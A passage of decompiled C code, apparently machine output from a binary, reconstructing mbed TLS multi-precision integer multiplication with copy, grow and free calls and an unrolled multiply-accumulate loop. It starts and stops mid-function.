    int32_t v1 = (int32_t)a1;
    int32_t v2 = (int32_t)a3;
    int32_t v3 = g5; // 0x80579d3
    int32_t v4 = g7; // 0x80579d4
    int32_t v5 = g3; // 0x80579d5
    int32_t v6 = 1; // bp-60
    int32_t v7 = 1; // bp-72
    int32_t v8; // 0x8057de2_0
    int32_t v9; // 0x8057df1_0
    int32_t v10; // 0x8057aa1
    int32_t v11; // 0x8057ade
    int32_t v12; // 0x8057e1a
    int32_t result; // 0x8057e1a141
    int32_t v13;
    int32_t v14;
    int32_t v15; // 0x8057aea
    int32_t v16; // 0x8057dbd
    int32_t v17; // 0x8057db2142
    int32_t v18; // 0x8057a94
    int32_t v19; // 0x8057a50
    int32_t v20; // 0x8057a66
    int32_t v21; // 0x8057a88
    int32_t v22; // 0x8057a69
    int32_t v23; // 0x8057b07
    int32_t v24; // 0x8057a24
    int32_t v25; // 0x8057a31
    int32_t v26; // 0x8057a3a
    int32_t v27; // 0x8057a5f
    int32_t v28; // 0x8057a66
    int32_t v29; // 0x8057a6f
    int32_t v30; // 0x8057af8
    int32_t v31; // 0x8057b10
    int32_t v32; // 0x8057b32143
    int32_t v33; // 0x8057d52146
    int32_t v34; // 0x8057d80164
    int32_t v35; // 0x8057daa152
    int32_t v36; // 0x8057a37
    int32_t v37; // 0x8057a80
    uint32_t v38; // 0x8057b2b
    int32_t v39; // 0x8057b2b
    if (a1 != a2) {
        // 0x80579d0
        v9 = &v7;
        v8 = (int32_t)a2;
        // branch -> 0x8057a0f
        // 0x8057a0f
        v20 = v2;
        if (v1 == v2) {
            // 0x8057e0d
            g1 = v9;
            v12 = mbedtls_mpi_copy((char *)&v7, a3);
            result = v12;
            if (v12 == 0) {
                // 0x8057e2a
                v20 = v9;
                // branch -> 0x8057a21
                // 0x8057a21
                v24 = *(int32_t *)(v8 + 4);
                v32 = 0;
                if (v24 != 0) {
                    // 0x8057a2e
                    v25 = *(int32_t *)(v8 + 8);
                    v36 = v24 - 1;
                    v26 = *(int32_t *)(v25 + 4 * v36);
                    g7 = v26;
                    if (v26 == 0) {
                        // 0x8057a53
                        g4 = v36;
                        if (v36 != 0) {
                            // 0x8057a48
                            v19 = v36;
                            // branch -> 0x8057a48
                            while (true) {
                                // 0x8057a48
                                if (*(int32_t *)(v25 - 4 + 4 * v19) == 0) {
                                    goto lab_0x8057a50_3;
                                }
                                // 0x8057a48
                                // branch -> 0x8057a5c
                            }
                        } else {
                            v32 = 0;
                        }
                    } else {
                        v32 = v24;
                    }
                }
                // 0x8057a5c
                v27 = *(int32_t *)(v20 + 4);
                g3 = v27;
                v18 = 0;
                if (v27 != 0) {
                    // 0x8057a66
                    v28 = *(int32_t *)(v20 + 8);
                    v22 = v27 - 1;
                    v29 = *(int32_t *)(v28 + 4 * v22);
                    g5 = v29;
                    if (v29 == 0) {
                        // 0x8057a8b
                        g3 = v22;
                        if (v22 != 0) {
                            // 0x8057a80
                            v21 = v22;
                            // branch -> 0x8057a80
                            while (true) {
                                // 0x8057a80
                                v37 = *(int32_t *)(v28 - 4 + 4 * v21);
                                g7 = v37;
                                if (v37 == 0) {
                                    goto lab_0x8057a88_5;
                                }
                                // 0x8057a80
                                // branch -> 0x8057a91
                            }
                        } else {
                            v18 = 0;
                        }
                    } else {
                        v18 = v27;
                    }
                }
                // 0x8057a91
                v10 = mbedtls_mpi_grow(v1, (char *)(v18 + v32));
                if (v10 == 0) {
                    // 0x8057ad0
                    v11 = mbedtls_mpi_lset((char *)v1, 0);
                    if (v11 == 0) {
                        // 0x8057aea
                        v15 = g3;
                        if (v15 != 0) {
                            // 0x8057af2
                            v30 = *(int32_t *)(v8 + 8);
                            v23 = v15 - 1;
                            v31 = *(int32_t *)(v1 + 8);
                            v39 = *(int32_t *)(v20 + 8) - 4;
                            v13 = v31 + 64 * (v32 - 16) / 16 + 4 * v15 + 60;
                            v16 = v23;
                            v17 = v31 + 4 * v23;
                            // branch -> 0x8057b28
                            while (true) {
                                // 0x8057b28
                                v38 = *(int32_t *)(v39 + 4 * v15);
                                if (v32 < 16) {
                                    v34 = v30;
                                    v14 = v17;
                                    v35 = 0;
                                    v33 = v32;
                                    goto lab_0x8057c8d_7;
                                }
                                goto lab_0x8057b60_7;
                            }
                        }
                        // 0x8057dca
                        *(int32_t *)v1 = *(int32_t *)v8 * *(int32_t *)v20;
                        result = 0;
                        // branch -> 0x8057aad
                    } else {
                        result = v11;
                    }
                } else {
                    result = v10;
                }
            }
            // 0x8057aad
            g1 = v9;
            g1 = mbedtls_mpi_free((int32_t *)v9);
            g6 = &v6;
            mbedtls_mpi_free(&v6);
            g3 = v5;
            g7 = v4;
            g5 = v3;
            return result;
        }
        // 0x8057a21
        v24 = *(int32_t *)(v8 + 4);
        v32 = 0;
        if (v24 != 0) {
            // 0x8057a2e
            v25 = *(int32_t *)(v8 + 8);
            v36 = v24 - 1;
            v26 = *(int32_t *)(v25 + 4 * v36);
            g7 = v26;
            if (v26 == 0) {
                // 0x8057a53
                g4 = v36;
                if (v36 != 0) {
                    // 0x8057a48
                    v19 = v36;
                    // branch -> 0x8057a48
                    while (true) {
                        // 0x8057a48
                        if (*(int32_t *)(v25 - 4 + 4 * v19) == 0) {
                            goto lab_0x8057a50_3;
                        }
                        // 0x8057a48
                        // branch -> 0x8057a5c
                    }
                } else {
                    v32 = 0;
                }
                // 0x8057a5c
                v27 = *(int32_t *)(v20 + 4);
                g3 = v27;
                v18 = 0;
                if (v27 != 0) {
                    // 0x8057a66
                    v28 = *(int32_t *)(v20 + 8);
                    v22 = v27 - 1;
                    v29 = *(int32_t *)(v28 + 4 * v22);
                    g5 = v29;
                    if (v29 == 0) {
                        // 0x8057a8b
                        g3 = v22;
                        if (v22 != 0) {
                            // 0x8057a80
                            v21 = v22;
                            // branch -> 0x8057a80
                            while (true) {
                                // 0x8057a80
                                v37 = *(int32_t *)(v28 - 4 + 4 * v21);
                                g7 = v37;
                                if (v37 == 0) {
                                    goto lab_0x8057a88_5;
                                }
                                // 0x8057a80
                                // branch -> 0x8057a91
                            }
                        } else {
                            v18 = 0;
                        }
                    } else {
                        v18 = v27;
                    }
                }
                // 0x8057a91
                v10 = mbedtls_mpi_grow(v1, (char *)(v18 + v32));
                result = v10;
                if (v10 == 0) {
                    // 0x8057ad0
                    v11 = mbedtls_mpi_lset((char *)v1, 0);
                    if (v11 == 0) {
                        // 0x8057aea
                        v15 = g3;
                        if (v15 != 0) {
                            // 0x8057af2
                            v30 = *(int32_t *)(v8 + 8);
                            v23 = v15 - 1;
                            v31 = *(int32_t *)(v1 + 8);
                            v39 = *(int32_t *)(v20 + 8) - 4;
                            v13 = v31 + 64 * (v32 - 16) / 16 + 4 * v15 + 60;
                            v16 = v23;
                            v17 = v31 + 4 * v23;
                            // branch -> 0x8057b28
                            while (true) {
                                // 0x8057b28
                                v38 = *(int32_t *)(v39 + 4 * v15);
                                if (v32 < 16) {
                                    v34 = v30;
                                    v14 = v17;
                                    v35 = 0;
                                    v33 = v32;
                                    goto lab_0x8057c8d_7;
                                }
                                goto lab_0x8057b60_7;
                            }
                        }
                        // 0x8057dca
                        *(int32_t *)v1 = *(int32_t *)v8 * *(int32_t *)v20;
                        result = 0;
                        // branch -> 0x8057aad
                    } else {
                        result = v11;
                    }
                }
                // 0x8057aad
                g1 = v9;
                g1 = mbedtls_mpi_free((int32_t *)v9);
                g6 = &v6;
                mbedtls_mpi_free(&v6);
                g3 = v5;
                g7 = v4;
                g5 = v3;
                return result;
            }
            v32 = v24;
        }
        // 0x8057a5c
        v27 = *(int32_t *)(v20 + 4);
        g3 = v27;
        v18 = 0;
        if (v27 != 0) {
            // 0x8057a66
            v28 = *(int32_t *)(v20 + 8);
            v22 = v27 - 1;
            v29 = *(int32_t *)(v28 + 4 * v22);
            g5 = v29;
            if (v29 == 0) {
                // 0x8057a8b
                g3 = v22;
                if (v22 != 0) {
                    // 0x8057a80
                    v21 = v22;
                    // branch -> 0x8057a80
                    while (true) {
                        // 0x8057a80
                        v37 = *(int32_t *)(v28 - 4 + 4 * v21);
                        g7 = v37;
                        if (v37 == 0) {
                            goto lab_0x8057a88_5;
                        }
                        // 0x8057a80
                        // branch -> 0x8057a91
                    }
                }
                // 0x8057a91
                v10 = mbedtls_mpi_grow(v1, (char *)v32);
                result = v10;
                if (v10 == 0) {
                    // 0x8057ad0
                    v11 = mbedtls_mpi_lset((char *)v1, 0);
                    if (v11 == 0) {
                        // 0x8057aea
                        v15 = g3;
                        if (v15 != 0) {
                            // 0x8057af2
                            v30 = *(int32_t *)(v8 + 8);
                            v23 = v15 - 1;
                            v31 = *(int32_t *)(v1 + 8);
                            v39 = *(int32_t *)(v20 + 8) - 4;
                            v13 = v31 + 64 * (v32 - 16) / 16 + 4 * v15 + 60;
                            v16 = v23;
                            v17 = v31 + 4 * v23;
                            // branch -> 0x8057b28
                            while (true) {
                                // 0x8057b28
                                v38 = *(int32_t *)(v39 + 4 * v15);
                                if (v32 < 16) {
                                    v34 = v30;
                                    v14 = v17;
                                    v35 = 0;
                                    v33 = v32;
                                    goto lab_0x8057c8d_7;
                                }
                                goto lab_0x8057b60_7;
                            }
                        }
                        // 0x8057dca
                        *(int32_t *)v1 = *(int32_t *)v8 * *(int32_t *)v20;
                        result = 0;
                        // branch -> 0x8057aad
                    } else {
                        result = v11;
                    }
                }
                // 0x8057aad
                g1 = v9;
                g1 = mbedtls_mpi_free((int32_t *)v9);
                g6 = &v6;
                mbedtls_mpi_free(&v6);
                g3 = v5;
                g7 = v4;
                g5 = v3;
                return result;
            }
            v18 = v27;
        }
        // 0x8057a91
        v10 = mbedtls_mpi_grow(v1, (char *)(v18 + v32));
        result = v10;
        if (v10 == 0) {
            // 0x8057ad0
            v11 = mbedtls_mpi_lset((char *)v1, 0);
            if (v11 == 0) {
                // 0x8057aea
                v15 = g3;
                if (v15 != 0) {
                    // 0x8057af2
                    v30 = *(int32_t *)(v8 + 8);
                    v23 = v15 - 1;
                    v31 = *(int32_t *)(v1 + 8);
                    v39 = *(int32_t *)(v20 + 8) - 4;
                    v13 = v31 + 64 * (v32 - 16) / 16 + 4 * v15 + 60;
                    v16 = v23;
                    v17 = v31 + 4 * v23;
                    // branch -> 0x8057b28
                    while (true) {
                        // 0x8057b28
                        v38 = *(int32_t *)(v39 + 4 * v15);
                        if (v32 < 16) {
                            v34 = v30;
                            v14 = v17;
                            v35 = 0;
                            v33 = v32;
                            goto lab_0x8057c8d_7;
                        }
                        goto lab_0x8057b60_7;
                    }
                }
                // 0x8057dca
                *(int32_t *)v1 = *(int32_t *)v8 * *(int32_t *)v20;
                result = 0;
                // branch -> 0x8057aad
            } else {
                result = v11;
            }
        }
        // 0x8057aad
        g1 = v9;
        g1 = mbedtls_mpi_free((int32_t *)v9);
        g6 = &v6;
        mbedtls_mpi_free(&v6);
        g3 = v5;
        g7 = v4;
        g5 = v3;
        return result;
    }
    // 0x8057ddf
    v8 = &v6;
    g1 = v8;
    int32_t v40 = mbedtls_mpi_copy((char *)&v6, a1); // 0x8057dec
    v9 = &v7;
    result = v40;
    if (v40 == 0) {
        // branch -> 0x8057a0f
        // 0x8057a0f
        v20 = v2;
        if (v1 == v2) {
            // 0x8057e0d
            g1 = v9;
            v12 = mbedtls_mpi_copy((char *)&v7, a3);
            result = v12;
            if (v12 == 0) {
                // 0x8057e2a
                v20 = v9;
                // branch -> 0x8057a21
                // 0x8057a21
                v24 = *(int32_t *)(v8 + 4);
                v32 = 0;
                if (v24 != 0) {
                    // 0x8057a2e
                    v25 = *(int32_t *)(v8 + 8);
                    v36 = v24 - 1;
                    v26 = *(int32_t *)(v25 + 4 * v36);
                    g7 = v26;
                    if (v26 == 0) {
                        // 0x8057a53
                        g4 = v36;
                        if (v36 != 0) {
                            // 0x8057a48
                            v19 = v36;
                            // branch -> 0x8057a48
                            while (true) {
                                // 0x8057a48
                                if (*(int32_t *)(v25 - 4 + 4 * v19) == 0) {
                                  lab_0x8057a50_3:;
                                    int32_t v41 = v19 - 1; // 0x8057a50
                                    g4 = v41;
                                    if (v41 == 0) {
                                        v32 = 0;
                                        // break -> 0x8057a53
                                        break;
                                    }
                                    v19 = v41;
                                    // continue -> 0x8057a48
                                    continue;
                                } else {
                                    // 0x8057a48
                                    v32 = v19;
                                    // branch -> 0x8057a5c
                                }
                                // 0x8057a5c
                                v27 = *(int32_t *)(v20 + 4);
                                g3 = v27;
                                v18 = 0;
                                if (v27 != 0) {
                                    // 0x8057a66
                                    v28 = *(int32_t *)(v20 + 8);
                                    v22 = v27 - 1;
                                    v29 = *(int32_t *)(v28 + 4 * v22);
                                    g5 = v29;
                                    if (v29 == 0) {
                                        // 0x8057a8b
                                        g3 = v22;
                                        if (v22 != 0) {
                                            // 0x8057a80
                                            v21 = v22;
                                            // branch -> 0x8057a80
                                            while (true) {
                                                // 0x8057a80
                                                v37 = *(int32_t *)(v28 - 4 + 4 * v21);
                                                g7 = v37;
                                                if (v37 == 0) {
                                                  lab_0x8057a88_5:;
                                                    int32_t v42 = v21 - 1; // 0x8057a88
                                                    g3 = v42;
                                                    if (v42 == 0) {
                                                        v18 = 0;
                                                        // break -> 0x8057a8b
                                                        break;
                                                    }
                                                    v21 = v42;
                                                    // continue -> 0x8057a80
                                                    continue;
                                                }
                                                // 0x8057a91
                                                v10 = mbedtls_mpi_grow(v1, (char *)(v21 + v32));
                                                result = v10;
                                                if (v10 == 0) {
                                                    // 0x8057ad0
                                                    v11 = mbedtls_mpi_lset((char *)v1, 0);
                                                    if (v11 == 0) {
                                                        // 0x8057aea
                                                        v15 = g3;
                                                        if (v15 != 0) {
                                                            // 0x8057af2
                                                            v30 = *(int32_t *)(v8 + 8);
                                                            v23 = v15 - 1;
                                                            v31 = *(int32_t *)(v1 + 8);
                                                            v39 = *(int32_t *)(v20 + 8) - 4;
                                                            v13 = v31 + 64 * (v32 - 16) / 16 + 4 * v15 + 60;
                                                            int32_t v43 = v15; // 0x8057b2b
                                                            v16 = v23;
                                                            v17 = v31 + 4 * v23;
                                                            // branch -> 0x8057b28
                                                            while (true) {
                                                                // 0x8057b28
                                                                v38 = *(int32_t *)(v39 + 4 * v43);
                                                                v34 = v30;
                                                                v14 = v17;
                                                                v35 = 0;
                                                                v33 = v32;
                                                                int32_t v44; // ebx
                                                                if (v32 >= 16) {
                                                                  lab_0x8057b60_7:;
                                                                    int32_t v45 = v30; // 0x8057d80167
                                                                    int32_t v46 = v17;
                                                                    int32_t v47 = v32 - 16; // 0x8057b60
                                                                    v44 = v38;
                                                                    uint64_t v48 = (int64_t)*(int32_t *)v45 * (int64_t)v38; // 0x8057b73
                                                                    uint32_t v49 = (int32_t)v48; // 0x8057b73
                                                                    uint32_t v50 = v49; // 0x8057b75
                                                                    int32_t * v51 = (int32_t *)v46; // 0x8057b7a_0
                                                                    uint32_t v52 = v50 + *v51; // 0x8057b7a
                                                                    *v51 = v52;
                                                                    int32_t v53 = *(int32_t *)(v45 + 4); // 0x8057b82
                                                                    uint64_t v54 = (int64_t)v44 * (int64_t)v53; // 0x8057b83
                                                                    uint32_t v55 = (int32_t)v54; // 0x8057b83
                                                                    uint32_t v56 = (int32_t)(v52 < v50) + (int32_t)(v50 < v49) + (int32_t)(v48 / 0x100000000) + v55; // 0x8057b85
                                                                    int32_t * v57 = (int32_t *)(v46 + 4); // 0x8057b8a_0
                                                                    uint32_t v58 = v56 + *v57; // 0x8057b8a
                                                                    *v57 = v58;
                                                                    int32_t v59 = *(int32_t *)(v45 + 8); // 0x8057b92
                                                                    uint64_t v60 = (int64_t)v44 * (int64_t)v59; // 0x8057b93
                                                                    uint32_t v61 = (int32_t)v60; // 0x8057b93
                                                                    uint32_t v62 = (int32_t)(v58 < v56) + (int32_t)(v56 < v55) + (int32_t)(v54 / 0x100000000) + v61; // 0x8057b95
                                                                    int32_t * v63 = (int32_t *)(v46 + 8); // 0x8057b9a_0
                                                                    uint32_t v64 = v62 + *v63; // 0x8057b9a
                                                                    *v63 = v64;
                                                                    int32_t v65 = *(int32_t *)(v45 + 12); // 0x8057ba2
                                                                    uint64_t v66 = (int64_t)v44 * (int64_t)v65; // 0x8057ba3
                                                                    uint32_t v67 = (int32_t)v66; // 0x8057ba3
                                                                    uint32_t v68 = (int32_t)(v64 < v62) + (int32_t)(v62 < v61) + (int32_t)(v60 / 0x100000000) + v67; // 0x8057ba5
                                                                    int32_t * v69 = (int32_t *)(v46 + 12); // 0x8057baa_0
                                                                    uint32_t v70 = v68 + *v69; // 0x8057baa
                                                                    *v69 = v70;
                                                                    int32_t v71 = *(int32_t *)(v45 + 16); // 0x8057bb2
                                                                    uint64_t v72 = (int64_t)v44 * (int64_t)v71; // 0x8057bb3
                                                                    uint32_t v73 = (int32_t)v72; // 0x8057bb3
                                                                    uint32_t v74 = (int32_t)(v70 < v68) + (int32_t)(v68 < v67) + (int32_t)(v66 / 0x100000000) + v73; // 0x8057bb5
                                                                    int32_t * v75 = (int32_t *)(v46 + 16); // 0x8057bba_0
                                                                    uint32_t v76 = v74 + *v75; // 0x8057bba
                                                                    *v75 = v76;
                                                                    int32_t v77 = *(int32_t *)(v45 + 20); // 0x8057bc2
                                                                    uint64_t v78 = (int64_t)v44 * (int64_t)v77; // 0x8057bc3
                                                                    uint32_t v79 = (int32_t)v78; // 0x8057bc3
                                                                    uint32_t v80 = (int32_t)(v76 < v74) + (int32_t)(v74 < v73) + (int32_t)(v72 / 0x100000000) + v79; // 0x8057bc5
                                                                    int32_t * v81 = (int32_t *)(v46 + 20); // 0x8057bca_0
                                                                    uint32_t v82 = v80 + *v81; // 0x8057bca
                                                                    *v81 = v82;
                                                                    int32_t v83 = *(int32_t *)(v45 + 24); // 0x8057bd2
                                                                    uint64_t v84 = (int64_t)v44 * (int64_t)v83; // 0x8057bd3
                                                                    uint32_t v85 = (int32_t)v84; // 0x8057bd3
                                                                    uint32_t v86 = (int32_t)(v82 < v80) + (int32_t)(v80 < v79) + (int32_t)(v78 / 0x100000000) + v85; // 0x8057bd5
                                                                    int32_t * v87 = (int32_t *)(v46 + 24); // 0x8057bda_0
                                                                    uint32_t v88 = v86 + *v87; // 0x8057bda
                                                                    *v87 = v88;
                                                                    int32_t v89 = *(int32_t *)(v45 + 28); // 0x8057be2
                                                                    uint64_t v90 = (int64_t)v44 * (int64_t)v89; // 0x8057be3
                                                                    uint32_t v91 = (int32_t)v90; // 0x8057be3
                                                                    uint32_t v92 = (int32_t)(v88 < v86) + (int32_t)(v86 < v85) + (int32_t)(v84 / 0x100000000) + v91; // 0x8057be5
                                                                    int32_t * v93 = (int32_t *)(v46 + 28); // 0x8057bea_0
                                                                    uint32_t v94 = v92 + *v93; // 0x8057bea
                                                                    *v93 = v94;
                                                                    int32_t v95 = *(int32_t *)(v45 + 32); // 0x8057bf2
                                                                    uint64_t v96 = (int64_t)v44 * (int64_t)v95; // 0x8057bf3
                                                                    uint32_t v97 = (int32_t)v96; // 0x8057bf3
                                                                    uint32_t v98 = (int32_t)(v94 < v92) + (int32_t)(v92 < v91) + (int32_t)(v90 / 0x100000000) + v97; // 0x8057bf5
                                                                    int32_t * v99 = (int32_t *)(v46 + 32); // 0x8057bfa_0
                                                                    uint32_t v100 = v98 + *v99; // 0x8057bfa
                                                                    *v99 = v100;
                                                                    int32_t v101 = *(int32_t *)(v45 + 36); // 0x8057c02
                                                                    uint64_t v102 = (int64_t)v44 * (int64_t)v101; // 0x8057c03
                                                                    uint32_t v103 = (int32_t)v102; // 0x8057c03
                                                                    uint32_t v104 = (int32_t)(v100 < v98) + (int32_t)(v98 < v97) + (int32_t)(v96 / 0x100000000) + v103; // 0x8057c05
                                                                    int32_t * v105 = (int32_t *)(v46 + 36); // 0x8057c0a_0
                                                                    uint32_t v106 = v104 + *v105; // 0x8057c0a
                                                                    *v105 = v106;
                                                                    int32_t v107 = *(int32_t *)(v45 + 40); // 0x8057c12
                                                                    uint64_t v108 = (int64_t)v44 * (int64_t)v107; // 0x8057c13
                                                                    uint32_t v109 = (int32_t)v108; // 0x8057c13
                                                                    uint32_t v110 = (int32_t)(v106 < v104) + (int32_t)(v104 < v103) + (int32_t)(v102 / 0x100000000) + v109; // 0x8057c15
                                                                    int32_t * v111 = (int32_t *)(v46 + 40); // 0x8057c1a_0
                                                                    uint32_t v112 = v110 + *v111; // 0x8057c1a
                                                                    *v111 = v112;
                                                                    int32_t v113 = *(int32_t *)(v45 + 44); // 0x8057c22
                                                                    uint64_t v114 = (int64_t)v44 * (int64_t)v113; // 0x8057c23
                                                                    uint32_t v115 = (int32_t)v114; // 0x8057c23
                                                                    uint32_t v116 = (int32_t)(v112 < v110) + (int32_t)(v110 < v109) + (int32_t)(v108 / 0x100000000) + v115; // 0x8057c25
                                                                    int32_t * v117 = (int32_t *)(v46 + 44); // 0x8057c2a_0
                                                                    uint32_t v118 = v116 + *v117; // 0x8057c2a
                                                                    *v117 = v118;
                                                                    int32_t v119 = *(int32_t *)(v45 + 48); // 0x8057c32
                                                                    uint64_t v120 = (int64_t)v44 * (int64_t)v119; // 0x8057c33
                                                                    uint32_t v121 = (int32_t)v120; // 0x8057c33
                                                                    uint32_t v122 = (int32_t)(v118 < v116) + (int32_t)(v116 < v115) + (int32_t)(v114 / 0x100000000) + v121; // 0x8057c35
                                                                    int32_t * v123 = (int32_t *)(v46 + 48); // 0x8057c3a_0
                                                                    uint32_t v124 = v122 + *v123; // 0x8057c3a
                                                                    *v123 = v124;
                                                                    int32_t v125 = *(int32_t *)(v45 + 52); // 0x8057c42
                                                                    uint64_t v126 = (int64_t)v44 * (int64_t)v125; // 0x8057c43
                                                                    uint32_t v127 = (int32_t)v126; // 0x8057c43
                                                                    uint32_t v128 = (int32_t)(v124 < v122) + (int32_t)(v122 < v121) + (int32_t)(v120 / 0x100000000) + v127; // 0x8057c45
                                                                    int32_t * v129 = (int32_t *)(v46 + 52); // 0x8057c4a_0
                                                                    uint32_t v130 = v128 + *v129; // 0x8057c4a
                                                                    *v129 = v130;
                                                                    int32_t v131 = *(int32_t *)(v45 + 56); // 0x8057c52
                                                                    uint64_t v132 = (int64_t)v44 * (int64_t)v131; // 0x8057c53
                                                                    uint32_t v133 = (int32_t)v132; // 0x8057c53
                                                                    uint32_t v134 = (int32_t)(v130 < v128) + (int32_t)(v128 < v127) + (int32_t)(v126 / 0x100000000) + v133; // 0x8057c55
                                                                    int32_t * v135 = (int32_t *)(v46 + 56); // 0x8057c5a_0
                                                                    uint32_t v136 = v134 + *v135; // 0x8057c5a
                                                                    *v135 = v136;
                                                                    int32_t v137 = *(int32_t *)(v45 + 60); // 0x8057c62
                                                                    uint64_t v138 = (int64_t)v44 * (int64_t)v137; // 0x8057c63
                                                                    uint32_t v139 = (int32_t)v138; // 0x8057c63
                                                                    uint32_t v140 = (int32_t)(v136 < v134) + (int32_t)(v134 < v133) + (int32_t)(v132 / 0x100000000) + v139; // 0x8057c65
                                                                    int32_t * v141 = (int32_t *)(v46 + 60); // 0x8057c6a_0
                                                                    uint32_t v142 = v140 + *v141; // 0x8057c6a
                                                                    int32_t v143 = (int32_t)(v142 < v140) + (int32_t)(v140 < v139) + (int32_t)(v138 / 0x100000000); // 0x8057c6c
                                                                    g4 = v143;
                                                                    *v141 = v142;
                                                                    int32_t v144 = v45 + 64; // 0x8057c7b
                                                                    // branch -> 0x8057b60
                                                                    while (v47 > 15) {
                                                                        // 0x8057b60
                                                                        v45 = v144;
                                                                        v46 += 64;
                                                                        v47 -= 16;
                                                                        v44 = v38;
                                                                        v48 = (int64_t)*(int32_t *)v45 * (int64_t)v38;
                                                                        v49 = (int32_t)v48;
                                                                        v50 = v49 + v143;
                                                                        v51 = (int32_t *)v46;
                                                                        v52 = v50 + *v51;
                                                                        *v51 = v52;
                                                                        v53 = *(int32_t *)(v45 + 4);
                                                                        v54 = (int64_t)v44 * (int64_t)v53;
                                                                        v55 = (int32_t)v54;
                                                                        v56 = (int32_t)(v52 < v50) + (int32_t)(v50 < v49) + (int32_t)(v48 / 0x100000000) + v55;
                                                                        v57 = (int32_t *)(v46 + 4);
                                                                        v58 = v56 + *v57;
                                                                        *v57 = v58;
                                                                        v59 = *(int32_t *)(v45 + 8);
                                                                        v60 = (int64_t)v44 * (int64_t)v59;
                                                                        v61 = (int32_t)v60;
                                                                        v62 = (int32_t)(v58 < v56) + (int32_t)(v56 < v55) + (int32_t)(v54 / 0x100000000) + v61;
                                                                        v63 = (int32_t *)(v46 + 8);
                                                                        v64 = v62 + *v63;
                                                                        *v63 = v64;
                                                                        v65 = *(int32_t *)(v45 + 12);
                                                                        v66 = (int64_t)v44 * (int64_t)v65;
                                                                        v67 = (int32_t)v66;
                                                                        v68 = (int32_t)(v64 < v62) + (int32_t)(v62 < v61) + (int32_t)(v60 / 0x100000000) + v67;
                                                                        v69 = (int32_t *)(v46 + 12);
                                                                        v70 = v68 + *v69;
                                                                        *v69 = v70;
                                                                        v71 = *(int32_t *)(v45 + 16);
                                                                        v72 = (int64_t)v44 * (int64_t)v71;
                                                                        v73 = (int32_t)v72;
                                                                        v74 = (int32_t)(v70 < v68) + (int32_t)(v68 < v67) + (int32_t)(v66 / 0x100000000) + v73;
                                                                        v75 = (int32_t *)(v46 + 16);
                                                                        v76 = v74 + *v75;
                                                                        *v75 = v76;
                                                                        v77 = *(int32_t *)(v45 + 20);
                                                                        v78 = (int64_t)v44 * (int64_t)v77;
                                                                        v79 = (int32_t)v78;
                                                                        v80 = (int32_t)(v76 < v74) + (int32_t)(v74 < v73) + (int32_t)(v72 / 0x100000000) + v79;
                                                                        v81 = (int32_t *)(v46 + 20);
                                                                        v82 = v80 + *v81;
                                                                        *v81 = v82;
                                                                        v83 = *(int32_t *)(v45 + 24);
                                                                        v84 = (int64_t)v44 * (int64_t)v83;
                                                                        v85 = (int32_t)v84;
                                                                        v86 = (int32_t)(v82 < v80) + (int32_t)(v80 < v79) + (int32_t)(v78 / 0x100000000) + v85;
                                                                        v87 = (int32_t *)(v46 + 24);
                                                                        v88 = v86 + *v87;
                                                                        *v87 = v88;
                                                                        v89 = *(int32_t *)(v45 + 28);
                                                                        v90 = (int64_t)v44 * (int64_t)v89;
                                                                        v91 = (int32_t)v90;
                                                                        v92 = (int32_t)(v88 < v86) + (int32_t)(v86 < v85) + (int32_t)(v84 / 0x100000000) + v91;
                                                                        v93 = (int32_t *)(v46 + 28);
                                                                        v94 = v92 + *v93;
                                                                        *v93 = v94;
                                                                        v95 = *(int32_t *)(v45 + 32);
                                                                        v96 = (int64_t)v44 * (int64_t)v95;
                                                                        v97 = (int32_t)v96;
                                                                        v98 = (int32_t)(v94 < v92) + (int32_t)(v92 < v91) + (int32_t)(v90 / 0x100000000) + v97;
                                                                        v99 = (int32_t *)(v46 + 32);
                                                                        v100 = v98 + *v99;
                                                                        *v99 = v100;
                                                                        v101 = *(int32_t *)(v45 + 36);
                                                                        v102 = (int64_t)v44 * (int64_t)v101;
                                                                        v103 = (int32_t)v102;
                                                                        v104 = (int32_t)(v100 < v98) + (int32_t)(v98 < v97) + (int32_t)(v96 / 0x100000000) + v103;
                                                                        v105 = (int32_t *)(v46 + 36);
                                                                        v106 = v104 + *v105;
                                                                        *v105 = v106;
                                                                        v107 = *(int32_t *)(v45 + 40);
                                                                        v108 = (int64_t)v44 * (int64_t)v107;
                                                                        v109 = (int32_t)v108;
                                                                        v110 = (int32_t)(v106 < v104) + (int32_t)(v104 < v103) + (int32_t)(v102 / 0x100000000) + v109;
                                                                        v111 = (int32_t *)(v46 + 40);
                                                                        v112 = v110 + *v111;
                                                                        *v111 = v112;
                                                                        v113 = *(int32_t *)(v45 + 44);
                                                                        v114 = (int64_t)v44 * (int64_t)v113;
                                                                        v115 = (int32_t)v114;
                                                                        v116 = (int32_t)(v112 < v110) + (int32_t)(v110 < v109) + (int32_t)(v108 / 0x100000000) + v115;
                                                                        v117 = (int32_t *)(v46 + 44);
                                                                        v118 = v116 + *v117;
                                                                        *v117 = v118;
                                                                        v119 = *(int32_t *)(v45 + 48);
                                                                        v120 = (int64_t)v44 * (int64_t)v119;
                                                                        v121 = (int32_t)v120;
                                                                        v122 = (int32_t)(v118 < v116) + (int32_t)(v116 < v115) + (int32_t)(v114 / 0x100000000) + v121;
                                                                        v123 = (int32_t *)(v46 + 48);
                                                                        v124 = v122 + *v123;
                                                                        *v123 = v124;
                                                                        v125 = *(int32_t *)(v45 + 52);
                                                                        v126 = (int64_t)v44 * (int64_t)v125;
                                                                        v127 = (int32_t)v126;
                                                                        v128 = (int32_t)(v124 < v122) + (int32_t)(v122 < v121) + (int32_t)(v120 / 0x100000000) + v127;
                                                                        v129 = (int32_t *)(v46 + 52);
                                                                        v130 = v128 + *v129;
                                                                        *v129 = v130;
                                                                        v131 = *(int32_t *)(v45 + 56);
                                                                        v132 = (int64_t)v44 * (int64_t)v131;
                                                                        v133 = (int32_t)v132;
                                                                        v134 = (int32_t)(v130 < v128) + (int32_t)(v128 < v127) + (int32_t)(v126 / 0x100000000) + v133;
                                                                        v135 = (int32_t *)(v46 + 56);
                                                                        v136 = v134 + *v135;
                                                                        *v135 = v136;
                                                                        v137 = *(int32_t *)(v45 + 60);
                                                                        v138 = (int64_t)v44 * (int64_t)v137;
                                                                        v139 = (int32_t)v138;
                                                                        v140 = (int32_t)(v136 < v134) + (int32_t)(v134 < v133) + (int32_t)(v132 / 0x100000000) + v139;
                                                                        v141 = (int32_t *)(v46 + 60);
                                                                        v142 = v140 + *v141;
                                                                        v143 = (int32_t)(v142 < v140) + (int32_t)(v140 < v139) + (int32_t)(v138 / 0x100000000);
                                                                        g4 = v143;
                                                                        *v141 = v142;
                                                                        v144 = v45 + 64;
                                                                        // continue -> 0x8057b60
                                                                    }
                                                                    // 0x8057c87
